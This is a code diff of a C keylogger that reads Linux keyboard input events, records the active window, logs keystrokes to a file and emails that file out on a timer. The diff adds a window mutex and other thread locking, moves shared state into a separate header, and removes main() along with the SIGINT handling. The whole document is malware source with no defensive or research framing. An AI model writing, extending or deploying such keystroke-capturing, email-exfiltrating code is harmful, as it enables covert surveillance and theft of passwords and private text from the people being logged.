@@ -1,10 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <signal.h>
-#include <stdint.h>
 #include <unistd.h>
-#include <fcntl.h>
 #include <linux/input.h>
 #include <pthread.h>
 #include <errno.h>
@@ -13,6 +10,8 @@
 #include "keyboard_handler.h"
 #include "send_email.h"
 #include "utils.h"
+#include "core_state.h"
+#include "keylogger.h"
 
 #define KEY_BUFFER_SIZE 64
 #define TEXT_BUFFER_SIZE 4096
@@ -21,24 +20,8 @@
 #error "DURATION is not defined"
 #endif
 
-static volatile sig_atomic_t exit_flag = 0;
-static int pipe_fd[2];
 pthread_mutex_t file_mutex = PTHREAD_MUTEX_INITIALIZER;
-
-typedef struct {
-    KeyboardHandler keyboard_handler;
-    FileHandler file_handler;
-    EmailSender sender;
-    int fd;
-} HandlerContext;
-
-void signal_handler(int sig) {
-    if (sig == SIGINT) {
-        exit_flag = 1;
-        char signal_data = 'x';
-        while (write(pipe_fd[1], &signal_data, 1) == -1 && errno == EINTR);
-    }
-}
+pthread_mutex_t window_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 void *read_keyboard(void *arg){
     HandlerContext *context = (HandlerContext*) arg;
@@ -62,16 +45,20 @@ void *read_keyboard(void *arg){
             fprintf(stderr, "Error getting active window\n");
         } else {
             int flag_update_current_window = 0;
+            pthread_mutex_lock(&window_mutex);
             if (!(context->keyboard_handler.active_window)){
                 flag_update_current_window = 1;
             } else if (strcmp(context->keyboard_handler.active_window, current_window)) {
                 free(context->keyboard_handler.active_window);
                 flag_update_current_window = 1;
             }
+            pthread_mutex_unlock(&window_mutex);
             if (flag_update_current_window){
+                pthread_mutex_lock(&window_mutex);
                 context->keyboard_handler.active_window = strdup(current_window);
                 write_error = write_or_buffer_event(&(context->file_handler), &buffer,
                                                     context->keyboard_handler.active_window, &file_mutex);
+                pthread_mutex_unlock(&window_mutex);
                 if (write_error) {
                     buffer_text_clear(&buffer);
                     pthread_exit((void *)1);
@@ -105,20 +92,27 @@ void *send_email(void *arg){
     while (!exit_flag){
         fd_set read_fds;
         FD_ZERO(&read_fds);
-        FD_SET(pipe_fd[0], &read_fds);
+        FD_SET(pipe_fd_email[0], &read_fds);
 
         struct timeval tv;
         tv.tv_sec = DURATION * 60;
         tv.tv_usec = 0;
 
-        int select_result = select(pipe_fd[0] + 1, &read_fds, NULL, NULL, &tv);
+        int select_result = select(pipe_fd_email[0] + 1, &read_fds, NULL, NULL, &tv);
         if (select_result > 0){
             char buffer[10];
-            read(pipe_fd[0], buffer, sizeof(buffer));
+            read(pipe_fd_email[0], buffer, sizeof(buffer));
             continue;
         } else if (select_result == 0){
+            pthread_mutex_lock(&window_mutex);
+            if (context->keyboard_handler.active_window) {
+                free(context->keyboard_handler.active_window);
+                context->keyboard_handler.active_window = NULL;
+            }
+            pthread_mutex_unlock(&window_mutex);
+
             pthread_mutex_lock(&file_mutex);
-            send_file_via_email(&(context->sender), &(context->file_handler), &(context->keyboard_handler.active_window));
+            send_file_via_email(&(context->sender), &(context->file_handler));
             pthread_mutex_unlock(&file_mutex);
         } else {
             if (errno == EINTR) continue;
@@ -145,54 +139,4 @@ void context_cleanup(HandlerContext *context){
     }
     KeyboardHandler_cleanup(&(context->keyboard_handler));
     EmailSender_cleanup(&(context->sender));
-}
-
-int main() {
-    HandlerContext context;
-    pthread_t thread_read, thread_send_email;
-    void *retval_read, *retval_send;
-    int code_read, code_send;
-    struct sigaction sa;
-
-    if (pipe(pipe_fd) != 0) {
-        fprintf(stderr, "Failed to create pipe\n");
-        return EXIT_FAILURE;
-    }
-
-    sa.sa_handler = signal_handler;
-    sigemptyset(&sa.sa_mask);
-    sa.sa_flags = 0;
-    if (sigaction(SIGINT, &sa, NULL) == -1) {
-        fprintf(stderr, "Error registering signal handler\n");
-        return EXIT_FAILURE;
-    }
-
-    if (context_init(&context)) {
-        context_cleanup(&context);
-        return EXIT_FAILURE;
-    }
-
-    if (pthread_create(&thread_read, NULL, read_keyboard, &context)){
-        fprintf(stderr, "pthread (pthread_read) create failed");
-        context_cleanup(&context);
-        return EXIT_FAILURE;
-    }
-
-    if (pthread_create(&thread_send_email, NULL, send_email, &context)){
-        fprintf(stderr, "pthread (pthread_send_email) create failed");
-        context_cleanup(&context);
-        return EXIT_FAILURE;
-    }
-
-    pthread_join(thread_send_email, &retval_send);
-    pthread_join(thread_read, &retval_read);
-    code_send = (int)(intptr_t)retval_send;
-    code_read = (int)(intptr_t)retval_read;
-    printf("Thread send email exit, value %d\n", code_send);
-    printf("Thread read keyboard exit, value %d\n", code_read);
-
-    context_cleanup(&context);
-    close(pipe_fd[0]);
-    close(pipe_fd[1]);
-    return code_read || code_send;
 }
